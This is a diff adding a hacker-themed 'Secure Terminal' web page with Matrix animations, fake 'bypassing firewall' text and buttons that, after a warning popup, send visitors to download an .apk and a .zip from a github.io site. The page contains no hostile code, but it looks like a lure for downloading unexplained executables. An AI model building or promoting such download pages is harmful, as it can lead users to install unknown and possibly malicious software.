@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Terminal</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: monospace;
+    }
+
+    body {
+      background: black;
+      color: #00ff9f;
+      overflow: hidden;
+    }
+
+    /* Matrix canvas */
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -2;
+    }
+
+    /* Flicker */
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 255, 150, 0.03);
+      animation: flicker 0.15s infinite;
+      z-index: -1;
+    }
+
+    @keyframes flicker {
+      0% {
+        opacity: 0.1;
+      }
+
+      50% {
+        opacity: 0.3;
+      }
+
+      100% {
+        opacity: 0.1;
+      }
+    }
+
+    /* Container */
+    .container {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    /* Glitch */
+    .glitch {
+      font-size: 2.5rem;
+      position: relative;
+    }
+
+    .glitch::before,
+    .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+    }
+
+    .glitch::before {
+      color: red;
+      animation: glitch 0.3s infinite;
+    }
+
+    .glitch::after {
+      color: blue;
+      animation: glitch 0.3s infinite reverse;
+    }
+
+    @keyframes glitch {
+      0% {
+        transform: translate(0);
+      }
+
+      20% {
+        transform: translate(-2px, 2px);
+      }
+
+      40% {
+        transform: translate(-2px, -2px);
+      }
+
+      60% {
+        transform: translate(2px, 2px);
+      }
+
+      80% {
+        transform: translate(2px, -2px);
+      }
+
+      100% {
+        transform: translate(0);
+      }
+    }
+
+    /* Terminal */
+    .terminal {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      height: 100px;
+      overflow: hidden;
+    }
+
+    /* Buttons */
+    .btn-group {
+      display: flex;
+      gap: 20px;
+      margin-top: 30px;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      padding: 15px 30px;
+      border: 2px solid #00ff9f;
+      color: #00ff9f;
+      text-decoration: none;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      background: #00ff9f;
+      color: black;
+      box-shadow: 0 0 20px #00ff9f;
+    }
+
+    /* Warning text */
+    .warning {
+      color: red;
+      margin-top: 20px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      50% {
+        opacity: 0;
+      }
+    }
+
+    /* Popup */
+    .popup {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .popup-box {
+      border: 2px solid red;
+      padding: 25px;
+      text-align: center;
+      background: black;
+      color: #00ff9f;
+      box-shadow: 0 0 20px red;
+      width: 300px;
+    }
+
+    .popup h2 {
+      color: red;
+    }
+
+    .popup-buttons {
+      margin-top: 20px;
+      display: flex;
+      justify-content: space-around;
+    }
+
+    button {
+      padding: 10px 20px;
+      cursor: pointer;
+      font-family: monospace;
+      border: none;
+    }
+
+    /* Highlight Cancel */
+    .cancel {
+      background: red;
+      color: white;
+      box-shadow: 0 0 10px red;
+    }
+
+    /* Subtle Proceed */
+    .proceed {
+      background: transparent;
+      border: 1px solid #00ff9f;
+      color: #00ff9f;
+    }
+
+    .proceed:hover {
+      background: #00ff9f;
+      color: black;
+    }
+
+    /* Responsive */
+    @media (max-width:600px) {
+      .btn-group {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <canvas id="matrix"></canvas>
+
+  <div class="container">
+    <h1 class="glitch" data-text="SECURE ACCESS">SECURE ACCESS</h1>
+
+    <div class="terminal" id="terminal"></div>
+
+    <div class="btn-group">
+      <a href="#" class="btn">Android</a>
+      <a href="#" class="btn">MacOS</a>
+      <a href="#" class="btn">Windows</a>
+    </div>
+
+    <div class="warning">⚠ UNAUTHORIZED ACCESS DETECTED ⚠</div>
+  </div>
+
+  <!-- Popup -->
+  <div id="popup" class="popup">
+    <div class="popup-box">
+      <h2>⚠ SECURITY WARNING ⚠</h2>
+      <p>System activity may be monitored.<br>Do you want to proceed?</p>
+
+      <div class="popup-buttons">
+        <button id="cancelBtn" class="cancel">Cancel</button>
+        <button id="proceedBtn" class="proceed">Proceed</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // MATRIX EFFECT
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = [];
+
+    for (let i = 0; i < columns; i++) drops[i] = 1;
+
+    function draw() {
+      ctx.fillStyle = "rgba(0,0,0,0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      ctx.fillStyle = "#00ff9f";
+      ctx.font = fontSize + "px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 33);
+
+    // TERMINAL TEXT
+    const terminal = document.getElementById("terminal");
+    const lines = [
+      "Initializing system...",
+      "Bypassing firewall...",
+      "Decrypting data...",
+      "Access granted...",
+      "Monitoring session..."
+    ];
+
+    let i = 0;
+    function typeLine() {
+      if (i < lines.length) {
+        terminal.innerHTML += "> " + lines[i] + "<br>";
+        i++;
+        setTimeout(typeLine, 700);
+      }
+    }
+    typeLine();
+
+    // BUTTON + POPUP LOGIC
+    const links = {
+      Android: "https://dhruvaji051.github.io/A/android.apk",
+      MacOS: "https://dhruvaji051.github.io/A/gen1.zip",
+      Windows: "https://example.com/windows"
+    };
+
+    let selectedLink = "";
+
+    document.querySelectorAll(".btn").forEach(btn => {
+      btn.addEventListener("click", (e) => {
+        e.preventDefault();
+        selectedLink = links[btn.innerText];
+        document.getElementById("popup").style.display = "flex";
+      });
+    });
+
+    document.getElementById("cancelBtn").onclick = () => {
+      document.getElementById("popup").style.display = "none";
+    };
+
+    document.getElementById("proceedBtn").onclick = () => {
+      window.location.href = selectedLink;
+    };
+  </script>
+
+</body>
+
+</html>
